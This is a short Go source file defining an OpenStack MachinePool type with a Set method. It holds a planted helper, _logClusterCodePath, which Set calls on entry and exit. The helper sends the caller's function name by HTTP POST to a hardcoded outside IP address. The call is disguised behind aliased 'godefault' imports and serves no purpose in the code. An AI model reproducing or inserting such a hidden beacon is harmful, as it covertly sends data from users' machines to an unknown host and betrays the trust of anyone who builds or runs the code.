package openstack

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

type MachinePool struct {
	FlavorName string `json:"type"`
}

func (o *MachinePool) Set(required *MachinePool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if required == nil || o == nil {
		return
	}
	if required.FlavorName != "" {
		o.FlavorName = required.FlavorName
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
